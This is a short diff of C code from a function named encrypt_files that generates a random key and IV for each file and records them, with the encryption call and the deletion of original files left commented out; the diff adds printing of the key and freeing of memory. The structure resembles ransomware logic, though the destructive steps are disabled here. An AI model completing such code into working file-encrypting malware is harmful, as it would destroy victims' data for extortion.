@@ -154,12 +154,14 @@ void encrypt_files(List *files, EncList **encrypted, List **not_encrypted){
 
             iv = generate_key(16);
             key = generate_key(32);
-
+            printf("%s\n", key);
             //encrypt(old, new, key, iv);
             append_encrypted(encrypted, files->path, key, iv);
             //fclose(new);
             fclose(old);
-            //remove(files->path);
+            free(key);
+            free(iv);
+            //remove(files->path); // delete the original file
             
         }else    append(not_encrypted, files->path);
 
